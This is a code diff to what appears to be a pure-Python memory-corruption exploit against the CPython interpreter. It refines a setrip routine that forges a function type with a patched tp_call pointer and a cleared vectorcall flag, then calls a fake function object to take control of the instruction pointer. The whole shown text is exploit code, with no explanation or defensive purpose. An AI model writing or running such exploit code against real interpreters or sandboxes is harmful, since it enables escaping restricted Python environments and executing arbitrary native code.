@@ -33,6 +33,11 @@ def p64a(*n):
 	return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]
 
 
+def u64(buf):
+	# TODO: py2 compat
+	return int.from_bytes(buf, "little")
+
+
 def addrof(obj):
 	return id(obj)
 
@@ -150,13 +155,20 @@ def setrip(addr):
 	my_functype = getmem()[ft_addr:ft_addr+ft_len]
 
 	# patch tp_call
-	my_functype[0x80:0x88] = p64a(addr)
+	my_functype[16*8:16*8 + 8] = p64a(addr)
+	
+	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags
+	tp_flags = u64(my_functype[21*8:21*8 + 8])
+	tp_flags &= ~ (1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
+	my_functype[21*8:21*8 + 8] = p64a(tp_flags)
 
 	# get a pointer to our patched function type
 	my_functype_ptr = refbytes(bytes(my_functype))
 
 	# create an instance of our custom function object
-	my_func_ptr = refbytes(bytes(p64a(0xcafebabe-2, my_functype_ptr))+bytes(0x100))
+	fake_funcobj = bytes(p64a(0xcafebabe-2, my_functype_ptr))
+	fake_funcobj += bytes(sizeof(nullfunc))  # padding
+	my_func_ptr = refbytes(fake_funcobj)
 	my_func = fakeobj(my_func_ptr)
 
 	# call it!
